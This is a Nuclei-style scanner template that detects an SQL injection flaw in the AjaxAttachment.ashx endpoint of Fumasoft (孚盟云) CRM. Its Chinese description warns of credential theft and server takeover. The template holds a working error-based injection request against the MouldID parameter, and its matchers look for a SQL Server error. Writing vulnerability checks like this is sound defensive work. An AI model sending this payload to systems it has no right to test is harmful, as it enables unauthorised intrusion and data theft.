id: fumasoft-AjaxAttachment-sqli
info:
  name: 孚盟云CRM AjaxAttachment.ashx SQL注入漏洞
  author: leadlife
  severity: high
  description: 上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxAttachment.ashx接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/tlzg6oyrnx09hbwb
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: fumasoft,sqli

http:
  - raw:
      - |
        GET /m/Dingding/Ajax/AjaxAttachment.ashx?method=saveAttach&MouldID=1'and+1<@@version-- HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'Microsoft SQL Server')
        condition: and